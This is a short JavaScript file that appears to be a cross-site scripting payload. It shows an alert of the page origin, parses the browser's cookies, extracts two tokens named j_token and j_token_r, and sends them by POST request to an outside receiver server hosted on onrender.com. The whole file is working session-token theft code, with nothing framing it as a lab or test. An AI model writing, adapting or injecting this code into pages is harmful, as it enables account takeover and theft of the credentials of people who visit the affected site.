console.log("sender loaded");
alert(origin)
let cookies = {};

document.cookie.split("; ").forEach(cookie => {

    let index = cookie.indexOf("=");

    let key = cookie.substring(0, index);
    let value = cookie.substring(index + 1);

    cookies[key] = value;

});


let data = {
    j_token: cookies.j_token,
    j_token_r: cookies.j_token_r
};


console.log(data);

fetch("https://receiver-server-zqey.onrender.com/receiver", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            message: data
        })

    })
    .then(async (r) => {

        console.log("Status:", r.status);

        const response = await r.text();

        console.log("Response:", response);

    })
    .catch(err => {

        console.error("Fetch error:", err);

});

